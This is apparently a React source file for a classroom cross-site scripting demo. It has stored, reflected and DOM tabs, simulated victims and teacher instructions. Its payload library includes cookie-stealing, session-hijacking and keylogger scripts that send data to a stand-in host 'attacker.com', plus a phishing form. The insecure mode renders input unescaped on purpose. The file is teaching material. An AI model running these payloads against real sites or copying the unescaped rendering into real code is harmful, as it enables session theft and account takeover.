import React, { useState, useEffect } from 'react';
import { useSecurityMode } from '../contexts/SecurityModeContext';
import DemoCard from '../components/common/DemoCard';
import Textarea from '../components/common/Textarea';
import Button from '../components/common/Button';
import CodeBlock from '../components/common/CodeBlock';
import Alert from '../components/common/Alert';
import InfoPanel from '../components/common/InfoPanel';
import Badge from '../components/common/Badge';
import Input from '../components/common/Input';
import { xssAPI } from '../services/api';

const XSS = () => {
  const { mode, isSecure } = useSecurityMode();
  const [comment, setComment] = useState('');
  const [comments, setComments] = useState([]);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState('stored');
  const [searchQuery, setSearchQuery] = useState('');
  const [searchResults, setSearchResults] = useState(null);
  const [sessionInfo, setSessionInfo] = useState(null);
  const [attackExecutions, setAttackExecutions] = useState([]);
  const [reflectedAttackExecutions, setReflectedAttackExecutions] = useState([]);
  const [simulatedUsers, setSimulatedUsers] = useState([
    { id: 1, name: 'Alice', viewing: false, affected: false, cookies: '', sessionId: '' },
    { id: 2, name: 'Bob', viewing: false, affected: false, cookies: '', sessionId: '' },
    { id: 3, name: 'Charlie', viewing: false, affected: false, cookies: '', sessionId: '' },
  ]);
  const [demoMode, setDemoMode] = useState(false);
  const [attackCount, setAttackCount] = useState(0);
  
  useEffect(() => {
    if (activeTab === 'stored') {
    loadComments();
    }
  }, [mode, activeTab]);
  
  const loadComments = async () => {
    try {
      const response = await xssAPI.getComments(mode);
      setComments(response.data.comments || []);
    } catch (error) {
      console.error('Failed to load comments:', error);
    }
  };
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!comment.trim()) return;
    
    setLoading(true);
    try {
      await xssAPI.addComment(comment, mode);
      const payload = comment;
      setComment('');
      await loadComments();
      
      // Simulate real-time attack execution for all users
      if (!isSecure && containsXSS(payload)) {
        simulateStoredXSSAttack(payload);
      }
    } catch (error) {
      console.error('Failed to add comment:', error);
    } finally {
      setLoading(false);
    }
  };
  
  const containsXSS = (text) => {
    const xssPatterns = [
      /<script/i,
      /onerror=/i,
      /onload=/i,
      /onclick=/i,
      /javascript:/i,
      /<iframe/i,
      /<img/i,
      /<svg/i,
      /<form/i
    ];
    return xssPatterns.some(pattern => pattern.test(text));
  };
  
  const simulateStoredXSSAttack = (payload) => {
    setAttackCount(prev => prev + 1);
    
    // Generate fake session data for demonstration
    const generateFakeSession = () => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < 32; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };
    
    // Reset simulated users first
    setSimulatedUsers([
      { id: 1, name: 'Alice', viewing: false, affected: false, cookies: '', sessionId: '' },
      { id: 2, name: 'Bob', viewing: false, affected: false, cookies: '', sessionId: '' },
      { id: 3, name: 'Charlie', viewing: false, affected: false, cookies: '', sessionId: '' },
    ]);
    
    // Log attack execution
    const execution = {
      id: Date.now(),
      payload: payload,
      timestamp: new Date().toLocaleTimeString(),
      usersAffected: 3,
      type: 'stored',
      attackNumber: attackCount + 1
    };
    setAttackExecutions(prev => [execution, ...prev]);
    
    // Simulate users viewing the comment
    setTimeout(() => {
      setSimulatedUsers([
        { id: 1, name: 'Alice', viewing: true, affected: false, cookies: '', sessionId: '' },
        { id: 2, name: 'Bob', viewing: true, affected: false, cookies: '', sessionId: '' },
        { id: 3, name: 'Charlie', viewing: true, affected: false, cookies: '', sessionId: '' },
      ]);
      
      // Simulate XSS execution affecting users
      setTimeout(() => {
        setSimulatedUsers([
          { 
            id: 1, 
            name: 'Alice', 
            viewing: true, 
            affected: true, 
            cookies: 'JSESSIONID=' + generateFakeSession() + '; auth_token=abc123xyz',
            sessionId: generateFakeSession()
          },
          { 
            id: 2, 
            name: 'Bob', 
            viewing: true, 
            affected: true, 
            cookies: 'JSESSIONID=' + generateFakeSession() + '; auth_token=def456uvw',
            sessionId: generateFakeSession()
          },
          { 
            id: 3, 
            name: 'Charlie', 
            viewing: true, 
            affected: true, 
            cookies: 'JSESSIONID=' + generateFakeSession() + '; auth_token=ghi789rst',
            sessionId: generateFakeSession()
          },
        ]);
      }, 1500);
    }, 500);
  };
  
  const runQuickDemo = async (type) => {
    if (type === 'stored') {
      const demoPayload = "<script>alert('XSS Attack! Cookies: ' + document.cookie)</script>";
      setComment(demoPayload);
      // Wait a moment for state to update, then submit
      setTimeout(async () => {
        setLoading(true);
        try {
          await xssAPI.addComment(demoPayload, mode);
          setComment('');
          await loadComments();
          if (!isSecure && containsXSS(demoPayload)) {
            simulateStoredXSSAttack(demoPayload);
          }
        } catch (error) {
          console.error('Demo failed:', error);
        } finally {
          setLoading(false);
        }
      }, 300);
    } else if (type === 'reflected') {
      const demoPayload = "<img src=x onerror='alert(\"XSS! Session stolen: \" + document.cookie)'>";
      setSearchQuery(demoPayload);
      // Wait a moment for state to update, then submit
      setTimeout(async () => {
        try {
          const response = await xssAPI.search(demoPayload, mode);
          setSearchResults(response.data);
          if (!isSecure && containsXSS(demoPayload)) {
            simulateReflectedXSSAttack(demoPayload);
          }
        } catch (error) {
          console.error('Demo failed:', error);
        }
      }, 300);
    }
  };
  
  const handleSearch = async (e) => {
    e.preventDefault();
    if (!searchQuery.trim()) return;
    
    try {
      const response = await xssAPI.search(searchQuery, mode);
      setSearchResults(response.data);
      
      // Simulate real-time reflected XSS attack
      if (!isSecure && containsXSS(searchQuery)) {
        simulateReflectedXSSAttack(searchQuery);
      }
    } catch (error) {
      console.error('Search failed:', error);
    }
  };
  
  const simulateReflectedXSSAttack = (payload) => {
    // Log reflected attack execution
    const execution = {
      id: Date.now(),
      payload: payload,
      timestamp: new Date().toLocaleTimeString(),
      usersAffected: 'All users viewing search results',
      type: 'reflected',
      url: `${window.location.origin}/xss?q=${encodeURIComponent(payload)}`
    };
    setReflectedAttackExecutions(prev => [execution, ...prev]);
  };
  
  const handleGetSessionInfo = async () => {
    try {
      const response = await xssAPI.getSessionInfo(mode);
      setSessionInfo(response.data);
    } catch (error) {
      console.error('Failed to get session info:', error);
    }
  };
  
  const escapeHtml = (text) => {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  };
  
  const xssPayloads = {
    stored: [
      { name: 'Basic Alert', payload: "<script>alert('XSS')</script>", description: 'Simple script execution' },
      { name: 'Cookie Stealer', payload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", description: 'Steals cookies and sends to attacker' },
      { name: 'Session Hijacker', payload: "<script>new Image().src='http://attacker.com/session?sid='+document.cookie</script>", description: 'Sends session ID to attacker server' },
      { name: 'Keylogger', payload: "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>", description: 'Logs all keystrokes' },
      { name: 'Phishing Form', payload: "<form action='http://attacker.com/phish'><input name='password' placeholder='Enter password'/><button>Submit</button></form>", description: 'Creates fake login form' },
      { name: 'Image XSS', payload: "<img src=x onerror='alert(\"XSS\")'>", description: 'XSS via image error handler' },
      { name: 'SVG XSS', payload: "<svg onload='alert(\"XSS\")'></svg>", description: 'XSS via SVG onload' },
      { name: 'Iframe Injection', payload: "<iframe src='javascript:alert(\"XSS\")'></iframe>", description: 'XSS via iframe' },
    ],
    reflected: [
      { name: 'URL Parameter', payload: "<script>alert(document.location)</script>", description: 'Reflected in URL parameters' },
      { name: 'Search Reflection', payload: "<img src=x onerror='alert(\"XSS\")'>", description: 'Reflected in search results' },
      { name: 'Cookie Stealer', payload: "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>", description: 'Redirects with cookies' },
    ],
    dom: [
      { name: 'DOM Manipulation', payload: "#<img src=x onerror='alert(\"XSS\")'>", description: 'DOM-based XSS' },
      { name: 'Hash XSS', payload: "#<script>alert('XSS')</script>", description: 'XSS via URL hash' },
    ]
  };
  
  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-3xl font-bold text-gray-900 mb-2">Cross-Site Scripting (XSS) Demo</h1>
        <p className="text-gray-600">
          Learn how XSS attacks inject malicious scripts into web pages and how to prevent them.
        </p>
      </div>
      
      {/* Mode Alert */}
      <Alert 
        type={isSecure ? 'success' : 'warning'}
        title={isSecure ? 'Secure Mode: HTML Encoding' : 'Insecure Mode: Raw HTML Rendering'}
      >
        {isSecure 
          ? 'This implementation uses HTML entity encoding to prevent script execution.'
          : 'This implementation renders user input as raw HTML, making it vulnerable to XSS attacks.'}
      </Alert>
      
      {/* Explanation Panel */}
      <InfoPanel title="What is Cross-Site Scripting (XSS)?" defaultOpen={true}>
        <p className="mb-3">
          XSS is a security vulnerability that allows attackers to inject malicious scripts into 
          web pages viewed by other users. These scripts can steal cookies, session tokens, or 
          perform actions on behalf of the user.
        </p>
        <p className="mb-3">
          <strong>Types of XSS:</strong>
        </p>
        <ul className="list-disc list-inside space-y-1 mb-3">
          <li><strong>Stored XSS:</strong> Malicious script is stored in the database and executed when viewed</li>
          <li><strong>Reflected XSS:</strong> Malicious script is reflected in the response (e.g., search results)</li>
          <li><strong>DOM-based XSS:</strong> Vulnerability exists in client-side code manipulating the DOM</li>
        </ul>
        <p className="mb-3">
          <strong>Common Attack Vectors:</strong>
        </p>
        <ul className="list-disc list-inside space-y-1">
          <li>Cookie/Session Theft</li>
          <li>Keylogging</li>
          <li>Phishing</li>
          <li>Defacement</li>
          <li>Account Takeover</li>
        </ul>
      </InfoPanel>
      
      {/* Attack Type Tabs */}
      <div className="border-b border-gray-200">
        <nav className="-mb-px flex space-x-8">
          {['stored', 'reflected', 'dom', 'cookie-stealing'].map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`py-4 px-1 border-b-2 font-medium text-sm ${
                activeTab === tab
                  ? 'border-blue-500 text-blue-600'
                  : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
              }`}
            >
              {tab.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ')}
            </button>
          ))}
        </nav>
      </div>
      
      {/* Teacher Demo Instructions */}
      {activeTab === 'stored' && (
        <DemoCard title="📚 Teacher's Demo Guide - Stored XSS" badge="For Instructors">
          <div className="space-y-4">
            <Alert type="info">
              <strong>Quick Demo Steps:</strong>
              <ol className="list-decimal list-inside mt-2 space-y-1">
                <li>Switch to <strong>Insecure Mode</strong> (toggle at top)</li>
                <li>Click "Run Quick Demo" button below OR manually enter a payload</li>
                <li>Watch the "Real-Time Attack Impact" section below</li>
                <li>Observe how ALL users viewing comments are affected</li>
              </ol>
            </Alert>
            <div className="flex gap-2">
              <Button 
                variant="danger" 
                onClick={() => runQuickDemo('stored')}
                className="flex-1"
              >
                🎬 Run Quick Demo (Stored XSS)
              </Button>
              <Button 
                variant="secondary" 
                onClick={() => setDemoMode(!demoMode)}
              >
                {demoMode ? 'Hide' : 'Show'} Detailed Instructions
              </Button>
            </div>
            {demoMode && (
              <div className="p-4 bg-blue-50 border border-blue-200 rounded">
                <h4 className="font-semibold mb-2">Example Scenario for Students:</h4>
                <p className="text-sm mb-2">
                  <strong>"Imagine a social media site where users can post comments..."</strong>
                </p>
                <ol className="list-decimal list-inside space-y-1 text-sm">
                  <li>Attacker posts a comment with malicious JavaScript: <code className="bg-gray-200 px-1 rounded">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                  <li>The comment is stored in the database (vulnerable mode)</li>
                  <li>When Alice, Bob, and Charlie view the comments page...</li>
                  <li>The malicious script executes in ALL their browsers automatically</li>
                  <li>Their cookies, session IDs, and personal data can be stolen</li>
                  <li>This is why it's called "Stored" XSS - it persists in the database</li>
                </ol>
              </div>
            )}
          </div>
        </DemoCard>
      )}
      
      {activeTab === 'reflected' && (
        <DemoCard title="📚 Teacher's Demo Guide - Reflected XSS" badge="For Instructors">
          <div className="space-y-4">
            <Alert type="info">
              <strong>Quick Demo Steps:</strong>
              <ol className="list-decimal list-inside mt-2 space-y-1">
                <li>Switch to <strong>Insecure Mode</strong> (toggle at top)</li>
                <li>Click "Run Quick Demo" button below OR manually enter a search query</li>
                <li>Watch the "Real-Time Attack Impact" section below</li>
                <li>See how the malicious URL can be shared to attack users</li>
              </ol>
            </Alert>
            <div className="flex gap-2">
              <Button 
                variant="danger" 
                onClick={() => runQuickDemo('reflected')}
                className="flex-1"
              >
                🎬 Run Quick Demo (Reflected XSS)
              </Button>
              <Button 
                variant="secondary" 
                onClick={() => setDemoMode(!demoMode)}
              >
                {demoMode ? 'Hide' : 'Show'} Detailed Instructions
              </Button>
            </div>
            {demoMode && (
              <div className="p-4 bg-blue-50 border border-blue-200 rounded">
                <h4 className="font-semibold mb-2">Example Scenario for Students:</h4>
                <p className="text-sm mb-2">
                  <strong>"Imagine a shopping website with a search feature..."</strong>
                </p>
                <ol className="list-decimal list-inside space-y-1 text-sm">
                  <li>Attacker creates a malicious URL: <code className="bg-gray-200 px-1 rounded">site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                  <li>Attacker sends this URL via email: "Check out this amazing deal!"</li>
                  <li>User clicks the link and visits the site</li>
                  <li>The search query is reflected in the page without encoding</li>
                  <li>XSS executes immediately in the user's browser</li>
                  <li>This is "Reflected" XSS - it doesn't persist, but executes on each visit</li>
                </ol>
              </div>
            )}
          </div>
        </DemoCard>
      )}
      
      {/* Stored XSS Demo */}
      {activeTab === 'stored' && (
        <>
          <DemoCard 
            title="Stored XSS Attack" 
            badge={isSecure ? 'Secure' : 'Vulnerable'}
          >
            <div className="mb-4">
              <h4 className="font-semibold mb-2">Attack Payloads Library:</h4>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-2 mb-4">
                {xssPayloads.stored.map((payload, idx) => (
                  <div key={idx} className="border rounded p-2 bg-gray-50">
                    <div className="font-medium text-sm mb-1">{payload.name}</div>
                    <div className="text-xs text-gray-600 mb-1">{payload.description}</div>
                    <code 
                      className="text-xs cursor-pointer hover:bg-gray-200 p-1 rounded block"
                      onClick={() => setComment(payload.payload)}
                      title="Click to use this payload"
                    >
                      {payload.payload.substring(0, 50)}...
                    </code>
                  </div>
                ))}
              </div>
            </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <Textarea
            label="Your Comment"
            value={comment}
            onChange={(e) => setComment(e.target.value)}
                placeholder="Enter your comment here... Try XSS payloads from above!"
            rows={4}
            required
          />
          <Button type="submit" disabled={loading}>
            {loading ? 'Submitting...' : 'Submit Comment'}
          </Button>
        </form>
      </DemoCard>
      
          {/* Real-time Attack Impact - Stored XSS */}
          <DemoCard 
            title="🚨 Real-Time Attack Impact - Stored XSS" 
            badge="Live Simulation"
          >
            <div className="space-y-4">
              <Alert type="warning">
                <div className="flex items-start gap-2">
                  <span className="text-2xl">⚠️</span>
                  <div>
                    <strong className="block mb-1">How Stored XSS Affects All Users:</strong>
                    <p className="text-sm">
                      When a malicious payload is stored in the database, it executes for 
                      <strong className="text-red-600"> EVERY user who views the content</strong>, 
                      not just the attacker. This is why it's called "Persistent" XSS.
                    </p>
                  </div>
                </div>
              </Alert>
              
              {/* Attack Statistics */}
              {attackExecutions.length > 0 && (
                <div className="grid grid-cols-3 gap-4 p-4 bg-red-50 border-2 border-red-300 rounded-lg">
                  <div className="text-center">
                    <div className="text-3xl font-bold text-red-600">{attackExecutions.length}</div>
                    <div className="text-sm text-gray-600">Attack(s) Executed</div>
                  </div>
                  <div className="text-center">
                    <div className="text-3xl font-bold text-red-600">{attackExecutions.length * 3}</div>
                    <div className="text-sm text-gray-600">Total Users Affected</div>
                  </div>
                  <div className="text-center">
                    <div className="text-3xl font-bold text-red-600">100%</div>
                    <div className="text-sm text-gray-600">Attack Success Rate</div>
                  </div>
                </div>
              )}
              
              {/* Simulated Users Viewing */}
              <div>
                <h4 className="font-semibold mb-3 flex items-center gap-2">
                  <span>👥</span>
                  <span>Simulated Users Viewing Comments:</span>
                  {simulatedUsers.some(u => u.viewing) && (
                    <Badge variant="warning" className="ml-auto animate-pulse">
                      {simulatedUsers.filter(u => u.viewing).length} Active
                    </Badge>
                  )}
                </h4>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                  {simulatedUsers.map((user) => (
                    <div 
                      key={user.id}
                      className={`border-2 rounded-lg p-4 transition-all duration-500 ${
                        user.affected 
                          ? 'border-red-500 bg-red-50 animate-pulse shadow-lg' 
                          : user.viewing 
                          ? 'border-yellow-500 bg-yellow-50 shadow-md' 
                          : 'border-gray-200 bg-gray-50'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <span className="text-xl">{user.id === 1 ? '👩' : user.id === 2 ? '👨' : '👤'}</span>
                          <span className="font-semibold">{user.name}</span>
                        </div>
                        {user.affected && (
                          <Badge variant="danger" className="text-xs animate-bounce">⚠️ ATTACKED</Badge>
                        )}
                        {user.viewing && !user.affected && (
                          <Badge variant="warning" className="text-xs">👀 Viewing</Badge>
                        )}
                        {!user.viewing && (
                          <Badge variant="info" className="text-xs">😴 Idle</Badge>
                        )}
                      </div>
                      <div className="text-xs text-gray-600 mb-2">
                        {user.affected 
                          ? '❌ XSS payload executed! Session compromised!'
                          : user.viewing 
                          ? '👁️ Viewing comments page...'
                          : '💤 Not viewing page'
                        }
                      </div>
                      {user.affected && user.cookies && (
                        <div className="mt-2 p-2 bg-red-100 rounded border border-red-300">
                          <div className="text-xs font-semibold text-red-700 mb-1">🔓 Stolen Data:</div>
                          <div className="text-xs text-red-600 font-mono break-all">
                            {user.cookies}
                          </div>
                          <div className="text-xs text-red-600 mt-1">
                            Session ID: {user.sessionId.substring(0, 16)}...
                          </div>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
              
              {/* Real-time Execution Indicator */}
              {attackExecutions.length > 0 && !isSecure && (
                <div className="mt-4 p-4 bg-red-100 border-2 border-red-500 rounded-lg animate-pulse">
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-3xl animate-bounce">🚨</span>
                    <span className="font-bold text-red-700 text-lg">XSS PAYLOAD EXECUTING NOW!</span>
                  </div>
                  <div className="text-sm text-red-600 space-y-1">
                    <div className="font-semibold">
                      ⚠️ The malicious script from the stored comment is executing in all users' browsers.
                    </div>
                    {attackExecutions[0]?.payload.includes('cookie') && (
                      <div className="mt-2 p-2 bg-red-200 rounded font-semibold">
                        🍪 Cookie/Session theft in progress... Data being sent to attacker!
                      </div>
                    )}
                    {attackExecutions[0]?.payload.includes('key') && (
                      <div className="mt-2 p-2 bg-red-200 rounded font-semibold">
                        ⌨️ Keylogger active - capturing all keystrokes!
                      </div>
                    )}
                    {attackExecutions[0]?.payload.includes('alert') && (
                      <div className="mt-2 p-2 bg-red-200 rounded font-semibold">
                        💬 Alert dialog would appear (blocked in demo for safety)
                      </div>
                    )}
                  </div>
                </div>
              )}
              
              {/* Attack Execution Log */}
              {attackExecutions.length > 0 && (
                <div className="mt-4">
                  <h4 className="font-semibold mb-2 flex items-center gap-2">
                    <span>📋</span>
                    <span>Attack Execution Log:</span>
                    <Badge variant="danger" className="ml-auto">
                      {attackExecutions.length} Attack(s)
                    </Badge>
                  </h4>
                  <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm max-h-60 overflow-y-auto border-2 border-red-500">
                    {attackExecutions.map((exec, idx) => (
                      <div key={exec.id} className="mb-3 border-l-4 border-red-500 pl-3 pb-2 border-b border-gray-700">
                        <div className="text-red-400 font-bold">
                          [{exec.timestamp}] 🚨 ATTACK #{exec.attackNumber} - XSS EXECUTED
                        </div>
                        <div className="text-yellow-400 mt-1">
                          Payload: <span className="text-yellow-300">{exec.payload.substring(0, 100)}...</span>
                        </div>
                        <div className="text-green-400 mt-1">
                          ✅ Users Affected: <span className="text-green-300 font-bold">{exec.usersAffected}</span>
                        </div>
                        <div className="text-blue-400 mt-1">
                          📌 Type: <span className="text-blue-300">Stored XSS (Persistent - Stays in Database)</span>
                        </div>
                        {!isSecure && (
                          <div className="text-red-500 mt-2 p-2 bg-red-900 rounded">
                            ⚠️ CRITICAL: All users viewing this comment will execute the malicious script!
                            <div className="text-xs mt-1 text-red-400">
                              This attack will continue to affect users until the comment is removed from the database.
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}
              
              {attackExecutions.length === 0 && (
                <div className="text-center text-gray-500 py-4">
                  No attacks executed yet. Submit a comment with an XSS payload to see the impact.
                </div>
              )}
              
              {/* Explanation */}
              <div className="mt-4 p-4 bg-blue-50 border-2 border-blue-300 rounded-lg">
                <h5 className="font-semibold text-blue-900 mb-3 flex items-center gap-2">
                  <span>📖</span>
                  <span>How Stored XSS Works (Step-by-Step):</span>
                </h5>
                <ol className="list-decimal list-inside space-y-2 text-blue-800 text-sm">
                  <li className="font-semibold">
                    Attacker submits a comment with XSS payload
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      Example: <code className="bg-blue-100 px-1 rounded">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                    </div>
                  </li>
                  <li className="font-semibold">
                    Payload is stored in the database (vulnerable mode)
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      The malicious code is saved permanently in the database
                    </div>
                  </li>
                  <li className="font-semibold">
                    When any user views the comments page, the payload executes
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      The browser interprets the stored HTML/JavaScript as code
                    </div>
                  </li>
                  <li className="font-semibold">
                    All users viewing the page are affected simultaneously
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      Alice, Bob, Charlie - all get attacked when they view comments
                    </div>
                  </li>
                  <li className="font-semibold">
                    Attack persists until the comment is removed
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      This is why it's called "Persistent" or "Stored" XSS
                    </div>
                  </li>
                </ol>
                <div className="mt-3 p-2 bg-yellow-100 border border-yellow-300 rounded">
                  <strong className="text-yellow-800">💡 Key Point for Students:</strong>
                  <p className="text-xs text-yellow-700 mt-1">
                    Unlike Reflected XSS, Stored XSS affects EVERYONE who views the content, 
                    not just the person who clicks a malicious link. This makes it more dangerous!
                  </p>
                </div>
              </div>
            </div>
          </DemoCard>
        </>
      )}
      
      {/* Reflected XSS Demo */}
      {activeTab === 'reflected' && (
        <>
          <DemoCard 
            title="Reflected XSS Attack" 
            badge={isSecure ? 'Secure' : 'Vulnerable'}
          >
            <p className="mb-4 text-gray-700">
              Reflected XSS occurs when user input is directly reflected in the response without proper encoding.
              This is common in search functionality, error messages, or URL parameters.
            </p>
            <div className="mb-4">
              <h4 className="font-semibold mb-2">Attack Payloads:</h4>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-2 mb-4">
                {xssPayloads.reflected.map((payload, idx) => (
                  <div key={idx} className="border rounded p-2 bg-gray-50">
                    <div className="font-medium text-sm mb-1">{payload.name}</div>
                    <div className="text-xs text-gray-600 mb-1">{payload.description}</div>
                    <code 
                      className="text-xs cursor-pointer hover:bg-gray-200 p-1 rounded block"
                      onClick={() => setSearchQuery(payload.payload)}
                      title="Click to use this payload"
                    >
                      {payload.payload.substring(0, 50)}...
                    </code>
                  </div>
                ))}
              </div>
            </div>
            <form onSubmit={handleSearch} className="space-y-4">
              <Input
                label="Search Query"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Enter search query... Try XSS payloads!"
                required
              />
              <Button type="submit">
                Search
              </Button>
            </form>
            {searchResults && (
              <div className="mt-4 p-4 bg-gray-50 rounded border">
                <h4 className="font-semibold mb-2">Search Results:</h4>
                <div 
                  className="text-gray-700"
                  dangerouslySetInnerHTML={isSecure 
                    ? { __html: escapeHtml(searchResults.results || '') }
                    : { __html: searchResults.results || '' }
                  }
                />
                {!isSecure && (
                  <Alert type="warning" className="mt-2">
                    ⚠️ The search results are rendered without encoding - XSS payloads will execute!
                  </Alert>
                )}
              </div>
            )}
          </DemoCard>
          
          {/* Real-time Attack Impact - Reflected XSS */}
          <DemoCard 
            title="🚨 Real-Time Attack Impact - Reflected XSS" 
            badge="Live Simulation"
          >
            <div className="space-y-4">
              <Alert type="warning">
                <div className="flex items-start gap-2">
                  <span className="text-2xl">⚠️</span>
                  <div>
                    <strong className="block mb-1">How Reflected XSS Affects Users:</strong>
                    <p className="text-sm">
                      When a user clicks a malicious link or visits a URL with an XSS payload, 
                      the payload executes <strong className="text-red-600">immediately in their browser</strong>.
                      Attackers often send these links via email, social media, or other channels.
                      This is "Non-Persistent" XSS - it doesn't stay in the database.
                    </p>
                  </div>
                </div>
              </Alert>
              
              {/* Attack Statistics */}
              {reflectedAttackExecutions.length > 0 && (
                <div className="grid grid-cols-3 gap-4 p-4 bg-red-50 border-2 border-red-300 rounded-lg">
                  <div className="text-center">
                    <div className="text-3xl font-bold text-red-600">{reflectedAttackExecutions.length}</div>
                    <div className="text-sm text-gray-600">Malicious URL(s)</div>
                  </div>
                  <div className="text-center">
                    <div className="text-3xl font-bold text-red-600">∞</div>
                    <div className="text-sm text-gray-600">Potential Victims</div>
                  </div>
                  <div className="text-center">
                    <div className="text-3xl font-bold text-red-600">100%</div>
                    <div className="text-sm text-gray-600">Click = Attack</div>
                  </div>
                </div>
              )}
              
              {/* Attack Execution Log */}
              {reflectedAttackExecutions.length > 0 && (
                <div>
                  <h4 className="font-semibold mb-2 flex items-center gap-2">
                    <span>📋</span>
                    <span>Attack Execution Log:</span>
                    <Badge variant="danger" className="ml-auto">
                      {reflectedAttackExecutions.length} URL(s) Generated
                    </Badge>
                  </h4>
                  <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm max-h-60 overflow-y-auto border-2 border-red-500">
                    {reflectedAttackExecutions.map((exec, idx) => (
                      <div key={exec.id} className="mb-3 border-l-4 border-red-500 pl-3 pb-2 border-b border-gray-700">
                        <div className="text-red-400 font-bold">
                          [{exec.timestamp}] 🚨 REFLECTED XSS ATTACK - URL GENERATED
                        </div>
                        <div className="text-yellow-400 mt-1">
                          Payload: <span className="text-yellow-300">{exec.payload.substring(0, 100)}...</span>
                        </div>
                        <div className="text-green-400 mt-1">
                          ✅ Users Affected: <span className="text-green-300 font-bold">{exec.usersAffected}</span>
                        </div>
                        <div className="text-blue-400 mt-1">
                          📌 Type: <span className="text-blue-300">Reflected XSS (Non-Persistent - Executes on Visit)</span>
                        </div>
                        <div className="text-purple-400 mt-1">
                          🔗 Malicious URL: 
                          <div className="text-purple-300 bg-purple-900 p-2 rounded mt-1 break-all">
                            {exec.url}
                          </div>
                        </div>
                        {!isSecure && (
                          <div className="text-red-500 mt-2 p-2 bg-red-900 rounded">
                            ⚠️ CRITICAL: Any user who visits this URL will execute the malicious script!
                            <div className="text-xs mt-1 text-red-400">
                              Attacker can send this URL via email, social media, or embed it in a website.
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}
              
              {/* Real-time Execution Indicator for Reflected XSS */}
              {reflectedAttackExecutions.length > 0 && !isSecure && (
                <div className="mt-4 p-4 bg-red-100 border-2 border-red-500 rounded-lg animate-pulse">
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-2xl">🚨</span>
                    <span className="font-bold text-red-700">XSS PAYLOAD EXECUTING NOW!</span>
                  </div>
                  <div className="text-sm text-red-600">
                    The malicious script from the search query is executing in the user's browser.
                    <div className="mt-2 space-y-1">
                      {reflectedAttackExecutions[0]?.payload.includes('cookie') && (
                        <div className="font-semibold">
                          ⚠️ Cookie/Session theft in progress...
                        </div>
                      )}
                      {reflectedAttackExecutions[0]?.payload.includes('location') && (
                        <div className="font-semibold">
                          ⚠️ Redirecting to attacker's site with stolen cookies...
                        </div>
                      )}
                      {reflectedAttackExecutions[0]?.payload.includes('alert') && (
                        <div className="font-semibold">
                          ⚠️ Alert dialog would appear (blocked in demo for safety)...
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}
              
              {reflectedAttackExecutions.length === 0 && (
                <div className="text-center text-gray-500 py-4">
                  No attacks executed yet. Perform a search with an XSS payload to see the impact.
                </div>
              )}
              
              {/* Attack Scenario Simulation */}
              {reflectedAttackExecutions.length > 0 && (
                <div className="mt-4">
                  <h4 className="font-semibold mb-3">🎯 Attack Scenario Simulation:</h4>
                  <div className="space-y-3">
                    <div className="border border-gray-300 rounded p-3 bg-gray-50">
                      <div className="flex items-start gap-2">
                        <span className="text-2xl">📧</span>
                        <div className="flex-1">
                          <div className="font-semibold text-sm mb-1">Step 1: Phishing Email</div>
                          <div className="text-xs text-gray-600">
                            Attacker sends email: "Check out this amazing deal! 
                            <a href={reflectedAttackExecutions[0]?.url} className="text-blue-600 underline">
                              {reflectedAttackExecutions[0]?.url}
                            </a>"
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="border border-gray-300 rounded p-3 bg-gray-50">
                      <div className="flex items-start gap-2">
                        <span className="text-2xl">👆</span>
                        <div className="flex-1">
                          <div className="font-semibold text-sm mb-1">Step 2: User Clicks Link</div>
                          <div className="text-xs text-gray-600">
                            User clicks the link, browser navigates to the vulnerable site with XSS payload in URL
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="border border-red-300 rounded p-3 bg-red-50">
                      <div className="flex items-start gap-2">
                        <span className="text-2xl">💥</span>
                        <div className="flex-1">
                          <div className="font-semibold text-sm mb-1 text-red-700">Step 3: XSS Executes</div>
                          <div className="text-xs text-red-600">
                            Malicious script executes in user's browser, stealing cookies, session, or performing actions
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="border border-orange-300 rounded p-3 bg-orange-50">
                      <div className="flex items-start gap-2">
                        <span className="text-2xl">🔒</span>
                        <div className="flex-1">
                          <div className="font-semibold text-sm mb-1 text-orange-700">Step 4: Session Compromised</div>
                          <div className="text-xs text-orange-600">
                            Attacker now has user's session/cookies and can impersonate them
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
